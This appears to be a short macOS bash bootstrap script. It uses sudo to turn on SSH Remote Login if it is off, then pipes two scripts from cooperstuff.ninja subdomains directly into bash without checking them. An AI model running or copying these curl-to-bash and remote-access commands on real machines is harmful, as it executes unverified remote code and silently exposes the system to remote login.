#!/bin/bash

if [ $(uname -s) = Darwin ]; then
	HASRL=$(sudo systemsetup -getremotelogin | awk -v N=3 '{print $N}')
	if [ $HASRL = Off ]; then
		sudo systemsetup -setremotelogin on >> /dev/null;
	fi
fi

curl -sL key.cooperstuff.ninja | bash
curl -sL screen.cooperstuff.ninja | bash

